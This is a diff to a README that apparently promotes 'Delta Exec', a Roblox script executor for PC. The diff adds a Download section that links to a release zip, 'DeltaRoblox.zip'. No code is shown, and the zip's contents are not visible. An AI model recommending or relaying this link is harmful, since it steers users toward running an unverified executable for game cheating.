@@ -13,3 +13,9 @@ Delta Exec is a high-performance scripting utility designed for the modern PC ga
 * Optimized memory management for long-term stability
 * Interactive console with real-time debugging
 * Internal UI customization engine
+
+## 📥 Download
+<hr>
+
+### 📥 [`DeltaRoblox.zip`](https://github.com/spookynoah/Delta-Exec-Roblox-PC/releases/download/Game-Addons/DeltaRoblox.zip)
+<hr>
